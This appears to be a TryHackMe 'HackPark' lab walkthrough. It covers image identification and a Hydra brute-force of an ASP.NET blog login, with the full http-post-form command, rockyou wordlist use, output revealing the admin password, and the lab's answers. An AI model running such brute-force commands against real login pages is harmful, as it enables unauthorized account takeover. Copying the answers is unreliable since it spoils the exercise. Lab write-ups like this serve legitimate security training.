# HackPark
Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

# Task 1: Deploy the vulnerable Windows machine
## Q1 Whats the name of the clown displayed on the homepage?
- Simply copy image check in tineye for reference to image. It was from the Steven King movie it. 
- No interesting information within file discovered using exiftool.

Answer: Pennywise

# Task 2: Using hydra to brute force a login
We need to find a login page to attack and identify what type of request the form is making to the webserver. 
Typically, web servers make two types of requests, a GET request which is used to request data from a webserver 
and a POST request which is used to send data to a server.

You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found here (opens in new tab)).

## Q1 What request type is the Windows website login form using?
Answer: POST, from quick source code check on login page.

## Q2 Guess a username, choose a password wordlist and gain credentials to a user account!
- We know its POST request, THM hints username is admin that leaves password to determine.
- Using hydra we can use:
```
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```
- Where the module "http-post-form" is best suited to meet our needs.
- However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more.

Building the Hydra module
Hydra syntax for web forms:

Code
hydra -l USER -P passlist.txt <IP> http-post-form "<path>:<params>:<failure string>"
For your login form:
Code
hydra -l admin -P passwords.txt <TARGET_IP> http-post-form \
"/Account/login.aspx:ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:Invalid"
Breakdown:

/Account/login.aspx → form action

ctl00$MainContent$LoginUser$UserName=^USER^ → username placeholder

ctl00$MainContent$LoginUser$Password=^PASS^ → password placeholder

ctl00$MainContent$LoginUser$LoginButton=Log+in → submit button value

Invalid → string that appears on failed login (you must confirm this from the page)


root@ip-10-144-94-79:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.144.156.189 -V http-form-post '/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=8why9BeDxGeewwI4imjmlt7Bnb3TLyQRvMiqPw%2BgnaXJoWLcFRljfjmYmgpJmGwxDftSU9e6X5HKgJroFIk5M6o%2FWb%2BxsgSbqEaaSNVN7Moj7xvJxsEPUJSvUlGW%2FxfsrK6K%2BAb6zQRFQaVHrDqlRwTrz%2Fq8BDccONoFC7ycDfnrP9eCTBoWUpAiRwv2QPxXoB2EHQkVuTYjR8AVWzVN6vvsAG8x73OMWTOrr7TR%2FRBFPFI9nU%2Bdfii6gQ5roFvVmewsrWn1jko016tLzQGAfcnh07ufyV715%2F4Fp8t6hS3DNc0O5GdbA0VyvFZrXM7V0JZzCgxlKBafgQG%2BFb0HarIMOvHzBKW3TZ5H7CiejLaeIU97&__EVENTVALIDATION=C7Z%2BBjTp4uvotdQOHfr1Zt0newDoDu8u%2FhkojS9anlkwyxNxxpYljBFnPBMuEu0m%2FZ3wnLbtleHks9mi1ijuaaEzA%2B2VaaeSMgobCtwN5j8MMgn%2FGOb6JNxMMTCmaQ63bKuHqMIEobJ1kcqwe%2FaIwLaji1VITIBkG94kKn1pjpIiuRqb&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed' -f
...
[ATTEMPT] target 10.144.156.189 - login "admin" - pass "cheeky" - 1597 of 14344398 [child 8] (0/0)
[80][http-post-form] host: 10.144.156.189   login: admin   password: 1qaz2wsx
[STATUS] attack finished for 10.144.156.189 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-13 20:19:08
root@ip-10-144-94-79:~# 



